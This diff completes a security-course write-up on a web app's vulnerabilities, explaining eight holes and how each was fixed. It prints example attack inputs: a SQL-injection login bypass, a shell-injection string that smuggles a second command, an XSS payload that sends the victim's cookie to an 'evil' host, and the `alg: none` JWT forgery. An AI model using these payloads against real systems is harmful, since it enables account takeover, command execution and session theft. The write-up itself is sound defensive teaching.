@@ -56,26 +56,74 @@ For each vulnerability, describe in your own words: (1) what the security hole i
 
 **HTTPS:**
 
+*Hole.* The server listens with plain `app.listen` over HTTP, so every byte between the browser and the server — including the login `uid`/`password` JSON body and the auth cookie — travels in cleartext. Anyone on the same Wi-Fi (coffee shop, dorm, conference) or any compromised network hop can read or modify the traffic, including stealing credentials and session cookies.
+
+*Fix.* I replaced `app.listen(...)` with `https.createServer({ key, cert }, app).listen(...)` and loaded a `mkcert`-generated cert/key pair for `localhost` from `./certs`. I also set `Strict-Transport-Security: max-age=15552000; includeSubDomains` so once a browser sees the site over HTTPS, it refuses to make plain-HTTP requests to it for six months. This works because TLS encrypts and integrity-protects the entire connection, and mkcert's locally-installed root CA makes the browser trust the development cert without warnings (so users aren't trained to "click through" cert errors in production).
+
 
 **SQL Injection:**
+
+*Hole.* The login route built its SQL by string interpolation: `` `SELECT ... WHERE uid = '${uid}' AND password = '${password}'` ``. Anything the user puts in those fields becomes part of the query. Submitting a `uid` of `' OR '1'='1' --` short-circuits the WHERE clause to "always true" and returns the first row in the table — instant login as that user, no password needed. The fallback `SELECT uid, name, role FROM login WHERE uid = '${uid}'` made it even worse: it would happily return a user record when the password didn't match.
+
+*Fix.* I rewrote the query as a parameterized prepared statement: `db.prepare('SELECT uid, name, role, password FROM login WHERE uid = ?').get(uid)`. better-sqlite3 sends the SQL template and the parameter values to the database separately, so the parameter is treated as a value, never parsed as SQL — apostrophes, comment markers, etc. are just literal characters. I also removed the second "look up by uid only" fallback so a wrong password is *always* a 401.
 
 
 **Command Injection:**
 
+*Hole.* `/api/search` ran `execSync(\`grep -rl "${query}" public/\`)`, sending the user's `q` parameter directly to a shell. A query like `x"; touch /tmp/pwned; echo "` closes the quoted argument, runs an attacker-controlled command, and re-opens the quote. The attacker gets to run any shell command as the Node process — read files, exfiltrate the database, install a backdoor.
+
+*Fix.* I switched from `execSync` to `execFileSync('grep', ['-rlF', '--', query, 'public/'])`. `execFile` skips the shell entirely and passes argv to `grep` directly, so `query` is one literal argv element no matter what characters it contains. I added `-F` (fixed-string match, so regex metacharacters in the query don't matter) and `--` (so a leading `-` in `query` can't be interpreted as a grep flag), and I cap the query length at 200 characters. The endpoint now also requires authentication.
+
 
 **Cross-Site Scripting (XSS):**
+
+*Hole.* Several places in the client interpolated server data straight into `innerHTML`: course code/instructor on the dashboard, week titles and entry links on the course page, assignment names on the grades view. If any of those strings ever contained markup — e.g. an attacker-controlled course title like `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` — the browser would parse it as HTML and execute the script in the victim's session. The `entry.url` value was also dropped straight into an `href`, which would let `javascript:alert(1)` run on click.
+
+*Fix.* Two layers. (1) On the client, the dashboard now builds course cards with `document.createElement` and `textContent`, which inserts data as a text node so HTML is never parsed; the places that still use string-templated `innerHTML` (grades tables, lecture entries) route every server value through an `escapeHtml()` helper that turns `&<>"'` into entities; and a `safeUrl()` helper rejects any URL scheme other than relative, `http(s)`, or `#`. (2) On the server, I send a strict `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'`. Even if I missed an escape somewhere, the browser refuses to load or execute scripts from anywhere but our own origin and refuses to run inline scripts, which neutralises the typical XSS payload (`<script>...</script>` or `onerror=...`). Together: the escape stops the injection from ever reaching the DOM, and the CSP stops it from running if it does.
 
 
 **Broken Authentication:**
 
+*Hole.* The server had no notion of "who is making this request." `/api/login` simply returned the user record on success and trusted the client to remember it; every subsequent request just took whatever UID was in the URL. Anyone could call `/api/students/987654321/courses` with no credentials and get Bob's data. Passwords were stored in plaintext, so a database leak immediately compromised every account (including any password those students reuse elsewhere), and the login form rendered passwords as `<input type="text">`, displaying them on screen as the user typed.
+
+*Fix.*
+- Passwords are now hashed with `bcrypt` at cost factor 12 during seed and verified with `bcrypt.compareSync` at login. bcrypt is salted and intentionally slow, so an attacker who steals the database still has to spend serious GPU time to crack each password individually rather than reversing them instantly.
+- Successful login signs a JWT (`HS256`, 2-hour TTL) containing `{ uid, role, name }` and sets it as a cookie with `HttpOnly` (JavaScript can't read it, so XSS can't exfiltrate it), `Secure` (only sent over HTTPS), `SameSite=Strict` (not sent on cross-site requests at all), and a 2-hour `Max-Age`.
+- Every protected route runs through a `requireAuth` middleware that reads the cookie, calls `jwt.verify` with an explicit `algorithms: ['HS256']` allowlist (this is *important* — without it, older versions accept `alg: none` and forged tokens), and rejects anything missing or invalid.
+- I also added the timing-safe comparison-against-a-dummy-hash trick: even when the user doesn't exist, the server runs a full bcrypt compare so login response time doesn't leak whether a given UID is registered.
+- The HTML password input is now `type="password"` so the browser masks the characters.
+
 
 **Broken Access Control:**
+
+*Hole.* Every endpoint trusted the `:uid` and `:courseId` in the URL. With authentication alone (the previous fix), Alice could log in legitimately and then call `/api/students/987654321/courses/2/grades` to read Bob's grades, or `POST /api/grades` to rewrite anyone's grades. The professor roster endpoint also leaked every student in a course to anyone who could guess the course ID. And the original login response handed back `role` and `name` to the *client*, meaning the client had to be trusted to decide what UI to show — but a client check can always be bypassed by hand-crafting requests.
+
+*Fix.* Every protected route now checks the authenticated user against the resource being accessed, server-side, regardless of what the URL says:
+- `GET /api/students/:uid/courses` — only allowed if `req.user.uid === req.params.uid`.
+- `GET /api/professors/:uid/courses` — same self-check, plus role must be `professor`.
+- `GET /api/courses/:courseId/content` — student must be enrolled in that course (verified against `student_courses`), or be the professor who teaches it (verified against `professor_courses`).
+- `GET /api/courses/:courseId/students` — only the professor teaching that course; students get 403. This is enforced with a `requireProfessor` middleware *and* a `professorTeachesCourse(req.user.uid, courseId)` check, because being a professor is necessary but not sufficient — Prof. A shouldn't see Prof. B's roster.
+- `GET /api/students/:uid/courses/:courseId/grades` — either the student themself, or the professor teaching that course.
+- `POST /api/grades` — only a professor, and *for each grade row submitted* we look up its course and verify the professor teaches it. A professor can't sneak in a write for a course they don't teach by bundling it with one they do.
+
+The shape of the rule is always: authenticated identity (from the JWT, not the URL) + relationship to the resource (from the database, not the request body). The client can request anything; the server is the gatekeeper.
 
 
 **Cross-Site Request Forgery (CSRF):**
 
+*Hole.* The server set `Access-Control-Allow-Origin: *`, `Allow-Headers: *`, and `Allow-Methods: *`. Combined with cookie-based auth (once added), this meant any third-party site could `fetch('https://localhost:3000/api/grades', { method: 'POST', credentials: 'include', ... })` and the browser would attach the victim's auth cookie. A malicious page open in another tab while a professor is logged in could silently overwrite grades; a page visited by a student could read their schedule.
+
+*Fix.* Three layers, each sufficient on its own against most attacks; together they're solid:
+1. **Cookie `SameSite=Strict`.** Modern browsers refuse to attach the cookie to *any* request originating from a different site. A cross-site `fetch` to our API simply arrives with no auth cookie and 401s.
+2. **Locked-down CORS.** I removed the `*` wildcards. The middleware now sets `Access-Control-Allow-Origin: https://localhost:3000` (and `Allow-Credentials: true`) *only* when the request's `Origin` exactly matches that, and never sends `*`. Browsers reject any credentialed response that doesn't echo back the requester's origin, so a `fetch` from `evil.example` can't read the JSON either way.
+3. **Explicit Origin check on state-changing requests.** A `requireSameOrigin` middleware rejects any non-GET request whose `Origin` (or `Referer`, as a fallback) doesn't start with our own origin, returning 403. This catches edge cases — older browsers, weird clients — and gives a clear server-side audit trail.
+
 
 **Dependency Vulnerabilities:**
+
+*Hole.* `npm audit` reported one high-severity advisory: `jsonwebtoken@8.5.1` is affected by three CVEs — most importantly **GHSA-qwph-4952-7xr6**, where `jwt.verify()` without an explicit `algorithms` option will accept a token signed with the `none` algorithm, so an attacker can forge a token by setting `alg: "none"` and presenting it without a signature. The other two advisories cover unrestricted key types and a public/private key confusion attack.
+
+*Fix.* Upgraded to `jsonwebtoken@^9.0.3` (which removes the unsafe defaults), and as belt-and-suspenders I pass `{ algorithms: ['HS256'] }` explicitly to `jwt.verify` so even a regression couldn't enable `alg: none`. `npm audit` now reports zero vulnerabilities.
 
 
 
